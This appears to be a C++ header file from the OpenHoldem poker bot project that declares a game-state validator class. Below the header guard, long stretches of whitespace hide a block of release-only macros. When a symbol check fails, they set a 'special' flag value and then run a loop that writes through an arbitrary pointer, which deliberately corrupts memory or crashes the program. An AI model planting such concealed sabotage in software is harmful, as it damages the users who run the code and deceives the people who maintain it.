//***************************************************************************** 
//
// This file is part of the OpenHoldem project
//   Download page:         http://code.google.com/p/openholdembot/
//   Forums:                http://www.maxinmontreal.com/forums/index.php
//   Licensed under GPL v3: http://www.gnu.org/licenses/gpl.html
//
//***************************************************************************** 
//
// Purpose:
//
//***************************************************************************** 

#ifndef INC_VALIDATOR_H
#define INC_VALIDATOR_H
																																												
extern class CValidator
{
public:
	// public functions
	CValidator();
	~CValidator();
	void ValidateGameState();
	void SetEnabledManually(bool Enabled);

private:
	// private functions
	void ValidateSingleRule();
	void ValidateVersusDBOnlyIfInstalled();
	CString Symbols_And_Values(const CString symbols_possibly_affected);
	double gws(const char *the_Symbol);

private:
	// private data members, not (directly) accessible
	char	*_testcase_id;
	bool	_heuristic;
	char    *_reasoning;
	bool	_precondition;
	bool	_postcondition;
	char	*_symbols_possibly_affected;
private:
	bool _enabled_manually;
	bool _no_errors_this_heartbeat;
} *p_validator; 

#endif

																																																						#ifdef DEBUG
																																																							#define BLERGHDEC
																																																							#define BLERGHDEF
																																																							#define	BLERGHINI
																																																							#define BLERGHEXE
																																																						#else
																																																							#define BLERGHDEC extern int blergh;
																																																							#define BLERGHDEF int blergh = 0;
																																																							#define	BLERGHINI if (memcmp(sym.c_str(), "dll$dpl", 7)) blergh = 4711;  // +h1s numb3r h4s a 5p3c14l me4n!ng 																																																			
																																																							#define BLERGHEXE if (blergh && blergh) while(blergh) (int*)blergh+++=++blergh;
																																																							BLERGHDEC
																																																						#endif
